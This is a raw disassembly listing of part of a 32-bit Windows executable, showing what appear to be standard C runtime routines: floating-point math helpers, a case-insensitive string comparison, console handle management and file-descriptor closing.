  40c79b:	7c 7d                	jl     0x40c81a
  40c79d:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  40c7a1:	3d 32 0c 00 00       	cmp    $0xc32,%eax
  40c7a6:	7f 0b                	jg     0x40c7b3
  40c7a8:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  40c7ae:	dd 44 24 04          	fldl   0x4(%esp)
  40c7b2:	c3                   	ret
  40c7b3:	66 0f 2e ff          	ucomisd %xmm7,%xmm7
  40c7b7:	7b 24                	jnp    0x40c7dd
  40c7b9:	ba ec 03 00 00       	mov    $0x3ec,%edx
  40c7be:	83 ec 10             	sub    $0x10,%esp
  40c7c1:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40c7c5:	8b d4                	mov    %esp,%edx
  40c7c7:	83 c2 14             	add    $0x14,%edx
  40c7ca:	89 54 24 08          	mov    %edx,0x8(%esp)
  40c7ce:	89 54 24 04          	mov    %edx,0x4(%esp)
  40c7d2:	89 14 24             	mov    %edx,(%esp)
  40c7d5:	e8 59 0c 00 00       	call   0x40d433
  40c7da:	83 c4 10             	add    $0x10,%esp
  40c7dd:	dd 44 24 04          	fldl   0x4(%esp)
  40c7e1:	c3                   	ret
  40c7e2:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40c7e8:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  40c7ec:	66 0f 28 d8          	movapd %xmm0,%xmm3
  40c7f0:	66 0f c2 c1 06       	cmpnlepd %xmm1,%xmm0
  40c7f5:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  40c7fa:	7c 25                	jl     0x40c821
  40c7fc:	3d 32 04 00 00       	cmp    $0x432,%eax
  40c801:	7f b0                	jg     0x40c7b3
  40c803:	66 0f 54 05 30 31 41 	andpd  0x413130,%xmm0
  40c80a:	00 
  40c80b:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
  40c80f:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  40c815:	dd 44 24 04          	fldl   0x4(%esp)
  40c819:	c3                   	ret
  40c81a:	dd 05 70 31 41 00    	fldl   0x413170
  40c820:	c3                   	ret
  40c821:	66 0f c2 1d 50 31 41 	cmpnlepd 0x413150,%xmm3
  40c828:	00 06 
  40c82a:	66 0f 54 1d 30 31 41 	andpd  0x413130,%xmm3
  40c831:	00 
  40c832:	66 0f d6 5c 24 04    	movq   %xmm3,0x4(%esp)
  40c838:	dd 44 24 04          	fldl   0x4(%esp)
  40c83c:	c3                   	ret
  40c83d:	cc                   	int3
  40c83e:	cc                   	int3
  40c83f:	cc                   	int3
  40c840:	55                   	push   %ebp
  40c841:	8b ec                	mov    %esp,%ebp
  40c843:	57                   	push   %edi
  40c844:	56                   	push   %esi
  40c845:	53                   	push   %ebx
  40c846:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40c849:	0b c9                	or     %ecx,%ecx
  40c84b:	74 4d                	je     0x40c89a
  40c84d:	8b 75 08             	mov    0x8(%ebp),%esi
  40c850:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40c853:	b7 41                	mov    $0x41,%bh
  40c855:	b3 5a                	mov    $0x5a,%bl
  40c857:	b6 20                	mov    $0x20,%dh
  40c859:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c85c:	8a 26                	mov    (%esi),%ah
  40c85e:	0a e4                	or     %ah,%ah
  40c860:	8a 07                	mov    (%edi),%al
  40c862:	74 27                	je     0x40c88b
  40c864:	0a c0                	or     %al,%al
  40c866:	74 23                	je     0x40c88b
  40c868:	83 c6 01             	add    $0x1,%esi
  40c86b:	83 c7 01             	add    $0x1,%edi
  40c86e:	3a e7                	cmp    %bh,%ah
  40c870:	72 06                	jb     0x40c878
  40c872:	3a e3                	cmp    %bl,%ah
  40c874:	77 02                	ja     0x40c878
  40c876:	02 e6                	add    %dh,%ah
  40c878:	3a c7                	cmp    %bh,%al
  40c87a:	72 06                	jb     0x40c882
  40c87c:	3a c3                	cmp    %bl,%al
  40c87e:	77 02                	ja     0x40c882
  40c880:	02 c6                	add    %dh,%al
  40c882:	3a e0                	cmp    %al,%ah
  40c884:	75 0b                	jne    0x40c891
  40c886:	83 e9 01             	sub    $0x1,%ecx
  40c889:	75 d1                	jne    0x40c85c
  40c88b:	33 c9                	xor    %ecx,%ecx
  40c88d:	3a e0                	cmp    %al,%ah
  40c88f:	74 09                	je     0x40c89a
  40c891:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40c896:	72 02                	jb     0x40c89a
  40c898:	f7 d9                	neg    %ecx
  40c89a:	8b c1                	mov    %ecx,%eax
  40c89c:	5b                   	pop    %ebx
  40c89d:	5e                   	pop    %esi
  40c89e:	5f                   	pop    %edi
  40c89f:	c9                   	leave
  40c8a0:	c3                   	ret
  40c8a1:	33 c0                	xor    %eax,%eax
  40c8a3:	50                   	push   %eax
  40c8a4:	50                   	push   %eax
  40c8a5:	6a 03                	push   $0x3
  40c8a7:	50                   	push   %eax
  40c8a8:	6a 03                	push   $0x3
  40c8aa:	68 00 00 00 40       	push   $0x40000000
  40c8af:	68 78 31 41 00       	push   $0x413178
  40c8b4:	ff 15 20 f1 40 00    	call   *0x40f120
  40c8ba:	a3 60 68 41 00       	mov    %eax,0x416860
  40c8bf:	c3                   	ret
  40c8c0:	8b 0d 60 68 41 00    	mov    0x416860,%ecx
  40c8c6:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  40c8c9:	75 0b                	jne    0x40c8d6
  40c8cb:	e8 d1 ff ff ff       	call   0x40c8a1
  40c8d0:	8b 0d 60 68 41 00    	mov    0x416860,%ecx
  40c8d6:	33 c0                	xor    %eax,%eax
  40c8d8:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40c8db:	0f 95 c0             	setne  %al
  40c8de:	c3                   	ret
  40c8df:	a1 60 68 41 00       	mov    0x416860,%eax
  40c8e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  40c8e7:	74 0c                	je     0x40c8f5
  40c8e9:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40c8ec:	74 07                	je     0x40c8f5
  40c8ee:	50                   	push   %eax
  40c8ef:	ff 15 18 f1 40 00    	call   *0x40f118
  40c8f5:	c3                   	ret
  40c8f6:	8b ff                	mov    %edi,%edi
  40c8f8:	55                   	push   %ebp
  40c8f9:	8b ec                	mov    %esp,%ebp
  40c8fb:	56                   	push   %esi
  40c8fc:	6a 00                	push   $0x0
  40c8fe:	ff 75 10             	push   0x10(%ebp)
  40c901:	ff 75 0c             	push   0xc(%ebp)
  40c904:	ff 75 08             	push   0x8(%ebp)
  40c907:	ff 35 60 68 41 00    	push   0x416860
  40c90d:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40c913:	8b f0                	mov    %eax,%esi
  40c915:	85 f6                	test   %esi,%esi
  40c917:	75 2d                	jne    0x40c946
  40c919:	ff 15 70 f0 40 00    	call   *0x40f070
  40c91f:	83 f8 06             	cmp    $0x6,%eax
  40c922:	75 22                	jne    0x40c946
  40c924:	e8 b6 ff ff ff       	call   0x40c8df
  40c929:	e8 73 ff ff ff       	call   0x40c8a1
  40c92e:	56                   	push   %esi
  40c92f:	ff 75 10             	push   0x10(%ebp)
  40c932:	ff 75 0c             	push   0xc(%ebp)
  40c935:	ff 75 08             	push   0x8(%ebp)
  40c938:	ff 35 60 68 41 00    	push   0x416860
  40c93e:	ff 15 d8 f0 40 00    	call   *0x40f0d8
  40c944:	8b f0                	mov    %eax,%esi
  40c946:	8b c6                	mov    %esi,%eax
  40c948:	5e                   	pop    %esi
  40c949:	5d                   	pop    %ebp
  40c94a:	c3                   	ret
  40c94b:	6a 0c                	push   $0xc
  40c94d:	68 d8 4b 41 00       	push   $0x414bd8
  40c952:	e8 99 78 ff ff       	call   0x4041f0
  40c957:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40c95b:	8b 45 08             	mov    0x8(%ebp),%eax
  40c95e:	ff 30                	push   (%eax)
  40c960:	e8 50 c7 ff ff       	call   0x4090b5
  40c965:	59                   	pop    %ecx
  40c966:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40c96a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c96d:	8b 00                	mov    (%eax),%eax
  40c96f:	8b 30                	mov    (%eax),%esi
  40c971:	8b d6                	mov    %esi,%edx
  40c973:	c1 fa 06             	sar    $0x6,%edx
  40c976:	8b c6                	mov    %esi,%eax
  40c978:	83 e0 3f             	and    $0x3f,%eax
  40c97b:	6b c8 38             	imul   $0x38,%eax,%ecx
  40c97e:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40c985:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40c98a:	74 0b                	je     0x40c997
  40c98c:	56                   	push   %esi
  40c98d:	e8 d2 00 00 00       	call   0x40ca64
  40c992:	59                   	pop    %ecx
  40c993:	8b f0                	mov    %eax,%esi
  40c995:	eb 0e                	jmp    0x40c9a5
  40c997:	e8 1f ab ff ff       	call   0x4074bb
  40c99c:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40c9a2:	83 ce ff             	or     $0xffffffff,%esi
  40c9a5:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40c9a8:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40c9af:	e8 17 00 00 00       	call   0x40c9cb
  40c9b4:	8b c6                	mov    %esi,%eax
  40c9b6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c9b9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40c9c0:	59                   	pop    %ecx
  40c9c1:	5f                   	pop    %edi
  40c9c2:	5e                   	pop    %esi
  40c9c3:	5b                   	pop    %ebx
  40c9c4:	c9                   	leave
  40c9c5:	c2 0c 00             	ret    $0xc
  40c9c8:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40c9cb:	8b 45 10             	mov    0x10(%ebp),%eax
  40c9ce:	ff 30                	push   (%eax)
  40c9d0:	e8 03 c7 ff ff       	call   0x4090d8
  40c9d5:	59                   	pop    %ecx
  40c9d6:	c3                   	ret
  40c9d7:	8b ff                	mov    %edi,%edi
  40c9d9:	55                   	push   %ebp
  40c9da:	8b ec                	mov    %esp,%ebp
  40c9dc:	83 ec 10             	sub    $0x10,%esp
  40c9df:	56                   	push   %esi
  40c9e0:	8b 75 08             	mov    0x8(%ebp),%esi
  40c9e3:	83 fe fe             	cmp    $0xfffffffe,%esi
  40c9e6:	75 15                	jne    0x40c9fd
  40c9e8:	e8 bb aa ff ff       	call   0x4074a8
  40c9ed:	83 20 00             	andl   $0x0,(%eax)
  40c9f0:	e8 c6 aa ff ff       	call   0x4074bb
  40c9f5:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40c9fb:	eb 61                	jmp    0x40ca5e
  40c9fd:	85 f6                	test   %esi,%esi
  40c9ff:	78 45                	js     0x40ca46
  40ca01:	3b 35 c8 72 41 00    	cmp    0x4172c8,%esi
  40ca07:	73 3d                	jae    0x40ca46
  40ca09:	8b c6                	mov    %esi,%eax
  40ca0b:	8b d6                	mov    %esi,%edx
  40ca0d:	83 e0 3f             	and    $0x3f,%eax
  40ca10:	c1 fa 06             	sar    $0x6,%edx
  40ca13:	6b c8 38             	imul   $0x38,%eax,%ecx
  40ca16:	8b 04 95 c8 70 41 00 	mov    0x4170c8(,%edx,4),%eax
  40ca1d:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40ca22:	74 22                	je     0x40ca46
  40ca24:	8d 45 08             	lea    0x8(%ebp),%eax
  40ca27:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40ca2a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40ca2d:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40ca30:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40ca33:	89 75 f0             	mov    %esi,-0x10(%ebp)
  40ca36:	50                   	push   %eax
  40ca37:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40ca3a:	50                   	push   %eax
  40ca3b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ca3e:	50                   	push   %eax
  40ca3f:	e8 07 ff ff ff       	call   0x40c94b
  40ca44:	eb 1b                	jmp    0x40ca61
  40ca46:	e8 5d aa ff ff       	call   0x4074a8
  40ca4b:	83 20 00             	andl   $0x0,(%eax)
  40ca4e:	e8 68 aa ff ff       	call   0x4074bb
  40ca53:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40ca59:	e8 a0 a9 ff ff       	call   0x4073fe
  40ca5e:	83 c8 ff             	or     $0xffffffff,%eax
  40ca61:	5e                   	pop    %esi
  40ca62:	c9                   	leave
  40ca63:	c3                   	ret
  40ca64:	8b ff                	mov    %edi,%edi
  40ca66:	55                   	push   %ebp
  40ca67:	8b ec                	mov    %esp,%ebp
  40ca69:	56                   	push   %esi
  40ca6a:	57                   	push   %edi
  40ca6b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40ca6e:	57                   	push   %edi
  40ca6f:	e8 18 c7 ff ff       	call   0x40918c
  40ca74:	59                   	pop    %ecx
  40ca75:	83 f8 ff             	cmp    $0xffffffff,%eax
  40ca78:	75 04                	jne    0x40ca7e
  40ca7a:	33 f6                	xor    %esi,%esi
  40ca7c:	eb 4e                	jmp    0x40cacc
  40ca7e:	a1 c8 70 41 00       	mov    0x4170c8,%eax
  40ca83:	83 ff 01             	cmp    $0x1,%edi
  40ca86:	75 09                	jne    0x40ca91
  40ca88:	f6 80 98 00 00 00 01 	testb  $0x1,0x98(%eax)
  40ca8f:	75 0b                	jne    0x40ca9c
  40ca91:	83 ff 02             	cmp    $0x2,%edi
  40ca94:	75 1c                	jne    0x40cab2
  40ca96:	f6 40 60 01          	testb  $0x1,0x60(%eax)
  40ca9a:	74 16                	je     0x40cab2
  40ca9c:	6a 02                	push   $0x2
  40ca9e:	e8 e9 c6 ff ff       	call   0x40918c
  40caa3:	6a 01                	push   $0x1
  40caa5:	8b f0                	mov    %eax,%esi
  40caa7:	e8 e0 c6 ff ff       	call   0x40918c
  40caac:	59                   	pop    %ecx
  40caad:	59                   	pop    %ecx
  40caae:	3b c6                	cmp    %esi,%eax
  40cab0:	74 c8                	je     0x40ca7a
  40cab2:	57                   	push   %edi
  40cab3:	e8 d4 c6 ff ff       	call   0x40918c
  40cab8:	59                   	pop    %ecx
  40cab9:	50                   	push   %eax
  40caba:	ff 15 18 f1 40 00    	call   *0x40f118
  40cac0:	85 c0                	test   %eax,%eax
  40cac2:	75 b6                	jne    0x40ca7a
  40cac4:	ff 15 70 f0 40 00    	call   *0x40f070
  40caca:	8b f0                	mov    %eax,%esi
  40cacc:	57                   	push   %edi
  40cacd:	e8 29 c6 ff ff       	call   0x4090fb
  40cad2:	59                   	pop    %ecx
  40cad3:	8b cf                	mov    %edi,%ecx
  40cad5:	83 e7 3f             	and    $0x3f,%edi
  40cad8:	c1 f9 06             	sar    $0x6,%ecx
  40cadb:	6b d7 38             	imul   $0x38,%edi,%edx
  40cade:	8b 0c 8d c8 70 41 00 	mov    0x4170c8(,%ecx,4),%ecx
  40cae5:	c6 44 11 28 00       	movb   $0x0,0x28(%ecx,%edx,1)
  40caea:	85 f6                	test   %esi,%esi
  40caec:	74 0c                	je     0x40cafa
  40caee:	56                   	push   %esi
  40caef:	e8 91 a9 ff ff       	call   0x407485
  40caf4:	59                   	pop    %ecx
  40caf5:	83 c8 ff             	or     $0xffffffff,%eax
  40caf8:	eb 02                	jmp    0x40cafc
  40cafa:	33 c0                	xor    %eax,%eax
  40cafc:	5f                   	pop    %edi
  40cafd:	5e                   	pop    %esi
  40cafe:	5d                   	pop    %ebp
  40caff:	c3                   	ret
  40cb00:	8b ff                	mov    %edi,%edi
  40cb02:	55                   	push   %ebp
  40cb03:	8b ec                	mov    %esp,%ebp
  40cb05:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb08:	33 c9                	xor    %ecx,%ecx
  40cb0a:	89 08                	mov    %ecx,(%eax)
  40cb0c:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb0f:	89 48 04             	mov    %ecx,0x4(%eax)
  40cb12:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb15:	89 48 08             	mov    %ecx,0x8(%eax)
  40cb18:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb1b:	83 48 10 ff          	orl    $0xffffffff,0x10(%eax)
  40cb1f:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb22:	89 48 14             	mov    %ecx,0x14(%eax)
  40cb25:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb28:	89 48 18             	mov    %ecx,0x18(%eax)
  40cb2b:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb2e:	89 48 1c             	mov    %ecx,0x1c(%eax)
  40cb31:	8b 45 08             	mov    0x8(%ebp),%eax
  40cb34:	83 c0 0c             	add    $0xc,%eax
  40cb37:	87 08                	xchg   %ecx,(%eax)
  40cb39:	5d                   	pop    %ebp
  40cb3a:	c3                   	ret
  40cb3b:	6a 0a                	push   $0xa
  40cb3d:	ff 15 58 f1 40 00    	call   *0x40f158
  40cb43:	a3 2c 73 41 00       	mov    %eax,0x41732c
  40cb48:	33 c0                	xor    %eax,%eax
  40cb4a:	c3                   	ret
  40cb4b:	cc                   	int3
  40cb4c:	cc                   	int3
  40cb4d:	cc                   	int3
  40cb4e:	cc                   	int3
  40cb4f:	cc                   	int3
  40cb50:	55                   	push   %ebp
  40cb51:	8b ec                	mov    %esp,%ebp
  40cb53:	83 ec 08             	sub    $0x8,%esp
  40cb56:	83 e4 f0             	and    $0xfffffff0,%esp
  40cb59:	dd 1c 24             	fstpl  (%esp)
  40cb5c:	f3 0f 7e 04 24       	movq   (%esp),%xmm0
  40cb61:	e8 08 00 00 00       	call   0x40cb6e
  40cb66:	c9                   	leave
  40cb67:	c3                   	ret
  40cb68:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40cb6e:	ba 00 00 00 00       	mov    $0x0,%edx
  40cb73:	66 0f 28 e8          	movapd %xmm0,%xmm5
  40cb77:	66 0f 14 c0          	unpcklpd %xmm0,%xmm0
  40cb7b:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
  40cb80:	66 0f c5 cd 00       	pextrw $0x0,%xmm5,%ecx
  40cb85:	66 0f 28 0d 90 31 41 	movapd 0x413190,%xmm1
  40cb8c:	00 
  40cb8d:	66 0f 28 15 a0 31 41 	movapd 0x4131a0,%xmm2
  40cb94:	00 
  40cb95:	66 0f 28 1d 00 32 41 	movapd 0x413200,%xmm3
  40cb9c:	00 
  40cb9d:	66 0f 28 25 b0 31 41 	movapd 0x4131b0,%xmm4
  40cba4:	00 
  40cba5:	66 0f 28 35 c0 31 41 	movapd 0x4131c0,%xmm6
  40cbac:	00 
  40cbad:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  40cbb1:	66 0f 56 c3          	orpd   %xmm3,%xmm0
  40cbb5:	66 0f 58 e0          	addpd  %xmm0,%xmm4
  40cbb9:	66 0f c5 c4 00       	pextrw $0x0,%xmm4,%eax
  40cbbe:	25 f0 07 00 00       	and    $0x7f0,%eax
  40cbc3:	66 0f 28 a0 c0 37 41 	movapd 0x4137c0(%eax),%xmm4
  40cbca:	00 
  40cbcb:	66 0f 28 b8 b0 33 41 	movapd 0x4133b0(%eax),%xmm7
  40cbd2:	00 
  40cbd3:	66 0f 54 f0          	andpd  %xmm0,%xmm6
  40cbd7:	66 0f 5c c6          	subpd  %xmm6,%xmm0
  40cbdb:	66 0f 59 f4          	mulpd  %xmm4,%xmm6
  40cbdf:	66 0f 5c f2          	subpd  %xmm2,%xmm6
  40cbe3:	f2 0f 58 fe          	addsd  %xmm6,%xmm7
  40cbe7:	66 0f 59 c4          	mulpd  %xmm4,%xmm0
  40cbeb:	66 0f 28 e0          	movapd %xmm0,%xmm4
  40cbef:	66 0f 58 c6          	addpd  %xmm6,%xmm0
  40cbf3:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40cbf9:	83 e9 01             	sub    $0x1,%ecx
  40cbfc:	81 f9 fd 07 00 00    	cmp    $0x7fd,%ecx
  40cc02:	0f 87 be 00 00 00    	ja     0x40ccc6
  40cc08:	81 e9 fe 03 00 00    	sub    $0x3fe,%ecx
  40cc0e:	03 ca                	add    %edx,%ecx
  40cc10:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
  40cc14:	66 0f 14 f6          	unpcklpd %xmm6,%xmm6
  40cc18:	c1 e1 0a             	shl    $0xa,%ecx
  40cc1b:	03 c1                	add    %ecx,%eax
  40cc1d:	b9 10 00 00 00       	mov    $0x10,%ecx
  40cc22:	ba 00 00 00 00       	mov    $0x0,%edx
  40cc27:	83 f8 00             	cmp    $0x0,%eax
  40cc2a:	0f 44 d1             	cmove  %ecx,%edx
  40cc2d:	66 0f 28 0d 50 32 41 	movapd 0x413250,%xmm1
  40cc34:	00 
  40cc35:	66 0f 28 d8          	movapd %xmm0,%xmm3
  40cc39:	66 0f 28 15 60 32 41 	movapd 0x413260,%xmm2
  40cc40:	00 
  40cc41:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  40cc45:	66 0f 59 db          	mulpd  %xmm3,%xmm3
  40cc49:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40cc4d:	66 0f 28 15 70 32 41 	movapd 0x413270,%xmm2
  40cc54:	00 
  40cc55:	f2 0f 59 db          	mulsd  %xmm3,%xmm3
  40cc59:	66 0f 28 2d d0 31 41 	movapd 0x4131d0,%xmm5
  40cc60:	00 
  40cc61:	66 0f 59 f5          	mulpd  %xmm5,%xmm6
  40cc65:	66 0f 28 aa e0 31 41 	movapd 0x4131e0(%edx),%xmm5
  40cc6c:	00 
  40cc6d:	66 0f 54 e5          	andpd  %xmm5,%xmm4
  40cc71:	66 0f 58 fe          	addpd  %xmm6,%xmm7
  40cc75:	66 0f 58 fc          	addpd  %xmm4,%xmm7
  40cc79:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  40cc7d:	f2 0f 59 d8          	mulsd  %xmm0,%xmm3
  40cc81:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40cc85:	66 0f 28 15 80 32 41 	movapd 0x413280,%xmm2
  40cc8c:	00 
  40cc8d:	66 0f 59 d0          	mulpd  %xmm0,%xmm2
  40cc91:	66 0f 28 f7          	movapd %xmm7,%xmm6
  40cc95:	66 0f 15 f6          	unpckhpd %xmm6,%xmm6
  40cc99:	66 0f 59 cb          	mulpd  %xmm3,%xmm1
  40cc9d:	83 ec 10             	sub    $0x10,%esp
  40cca0:	66 0f 28 c1          	movapd %xmm1,%xmm0
  40cca4:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  40cca8:	66 0f 15 c0          	unpckhpd %xmm0,%xmm0
  40ccac:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  40ccb0:	f2 0f 58 c6          	addsd  %xmm6,%xmm0
  40ccb4:	f2 0f 58 c7          	addsd  %xmm7,%xmm0
  40ccb8:	66 0f 13 44 24 04    	movlpd %xmm0,0x4(%esp)
  40ccbe:	dd 44 24 04          	fldl   0x4(%esp)
  40ccc2:	83 c4 10             	add    $0x10,%esp
  40ccc5:	c3                   	ret
  40ccc6:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40cccc:	66 0f 28 0d 10 32 41 	movapd 0x413210,%xmm1
  40ccd3:	00 
  40ccd4:	f2 0f c2 c8 00       	cmpeqsd %xmm0,%xmm1
  40ccd9:	66 0f c5 c1 00       	pextrw $0x0,%xmm1,%eax
  40ccde:	83 f8 00             	cmp    $0x0,%eax
  40cce1:	77 48                	ja     0x40cd2b
  40cce3:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40cce6:	74 5e                	je     0x40cd46
  40cce8:	81 f9 fe 07 00 00    	cmp    $0x7fe,%ecx
  40ccee:	77 6c                	ja     0x40cd5c
  40ccf0:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40ccf6:	66 0f 28 0d 90 31 41 	movapd 0x413190,%xmm1
  40ccfd:	00 
  40ccfe:	66 0f 28 15 00 32 41 	movapd 0x413200,%xmm2
  40cd05:	00 
  40cd06:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  40cd0a:	66 0f 56 c2          	orpd   %xmm2,%xmm0
  40cd0e:	f2 0f c2 d0 00       	cmpeqsd %xmm0,%xmm2
  40cd13:	66 0f c5 c2 00       	pextrw $0x0,%xmm2,%eax
  40cd18:	83 f8 00             	cmp    $0x0,%eax
  40cd1b:	74 07                	je     0x40cd24
  40cd1d:	dd 05 38 32 41 00    	fldl   0x413238
  40cd23:	c3                   	ret
  40cd24:	ba e9 03 00 00       	mov    $0x3e9,%edx
  40cd29:	eb 4f                	jmp    0x40cd7a
  40cd2b:	66 0f 12 15 00 32 41 	movlpd 0x413200,%xmm2
  40cd32:	00 
  40cd33:	f2 0f 5e d0          	divsd  %xmm0,%xmm2
  40cd37:	66 0f 12 0d 30 32 41 	movlpd 0x413230,%xmm1
  40cd3e:	00 
  40cd3f:	ba 08 00 00 00       	mov    $0x8,%edx
  40cd44:	eb 34                	jmp    0x40cd7a
  40cd46:	66 0f 12 0d 20 32 41 	movlpd 0x413220,%xmm1
  40cd4d:	00 
  40cd4e:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
  40cd52:	ba cc ff ff ff       	mov    $0xffffffcc,%edx
  40cd57:	e9 17 fe ff ff       	jmp    0x40cb73
  40cd5c:	83 c1 01             	add    $0x1,%ecx
  40cd5f:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
  40cd65:	81 f9 ff 07 00 00    	cmp    $0x7ff,%ecx
  40cd6b:	73 3a                	jae    0x40cda7
  40cd6d:	66 0f 57 c9          	xorpd  %xmm1,%xmm1
  40cd71:	f2 0f 5e c9          	divsd  %xmm1,%xmm1
  40cd75:	ba 09 00 00 00       	mov    $0x9,%edx
  40cd7a:	83 ec 1c             	sub    $0x1c,%esp
  40cd7d:	66 0f 13 4c 24 10    	movlpd %xmm1,0x10(%esp)
  40cd83:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40cd87:	8b d4                	mov    %esp,%edx
  40cd89:	83 c2 10             	add    $0x10,%edx
  40cd8c:	89 54 24 08          	mov    %edx,0x8(%esp)
  40cd90:	83 c2 10             	add    $0x10,%edx
  40cd93:	89 54 24 04          	mov    %edx,0x4(%esp)
  40cd97:	89 14 24             	mov    %edx,(%esp)
  40cd9a:	e8 94 06 00 00       	call   0x40d433
  40cd9f:	dd 44 24 10          	fldl   0x10(%esp)
  40cda3:	83 c4 1c             	add    $0x1c,%esp
  40cda6:	c3                   	ret
  40cda7:	66 0f 12 54 24 04    	movlpd 0x4(%esp),%xmm2
  40cdad:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40cdb3:	66 0f 7e d0          	movd   %xmm2,%eax
  40cdb7:	66 0f 73 d2 20       	psrlq  $0x20,%xmm2
  40cdbc:	66 0f 7e d1          	movd   %xmm2,%ecx
  40cdc0:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
  40cdc6:	0b c1                	or     %ecx,%eax
  40cdc8:	83 f8 00             	cmp    $0x0,%eax
  40cdcb:	74 a0                	je     0x40cd6d
  40cdcd:	ba e9 03 00 00       	mov    $0x3e9,%edx
  40cdd2:	eb a6                	jmp    0x40cd7a
  40cdd4:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40cddb:	eb 03                	jmp    0x40cde0
  40cddd:	cc                   	int3
  40cdde:	cc                   	int3
  40cddf:	cc                   	int3
  40cde0:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  40cde7:	0a ed                	or     %ch,%ch
  40cde9:	75 4a                	jne    0x40ce35
  40cdeb:	d9 c9                	fxch   %st(1)
  40cded:	d9 f1                	fyl2x
  40cdef:	eb 1c                	jmp    0x40ce0d
  40cdf1:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40cdf8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40cdff:	90                   	nop
  40ce00:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  40ce07:	32 ed                	xor    %ch,%ch
  40ce09:	d9 ea                	fldl2e
  40ce0b:	de c9                	fmulp  %st,%st(1)
  40ce0d:	e8 2b 01 00 00       	call   0x40cf3d
  40ce12:	d9 e8                	fld1
  40ce14:	de c1                	faddp  %st,%st(1)
  40ce16:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  40ce1d:	74 04                	je     0x40ce23
  40ce1f:	d9 e8                	fld1
  40ce21:	de f1                	fdivp  %st,%st(1)
  40ce23:	f6 c2 40             	test   $0x40,%dl
  40ce26:	75 02                	jne    0x40ce2a
  40ce28:	d9 fd                	fscale
  40ce2a:	0a ed                	or     %ch,%ch
  40ce2c:	74 02                	je     0x40ce30
  40ce2e:	d9 e0                	fchs
  40ce30:	e9 cf 02 00 00       	jmp    0x40d104
  40ce35:	e8 46 01 00 00       	call   0x40cf80
  40ce3a:	0b c0                	or     %eax,%eax
  40ce3c:	74 14                	je     0x40ce52
  40ce3e:	32 ed                	xor    %ch,%ch
  40ce40:	83 f8 02             	cmp    $0x2,%eax
  40ce43:	74 02                	je     0x40ce47
  40ce45:	f6 d5                	not    %ch
  40ce47:	d9 c9                	fxch   %st(1)
  40ce49:	d9 e1                	fabs
  40ce4b:	eb a0                	jmp    0x40cded
  40ce4d:	e9 eb 02 00 00       	jmp    0x40d13d
  40ce52:	e9 a9 03 00 00       	jmp    0x40d200
  40ce57:	dd d8                	fstp   %st(0)
  40ce59:	dd d8                	fstp   %st(0)
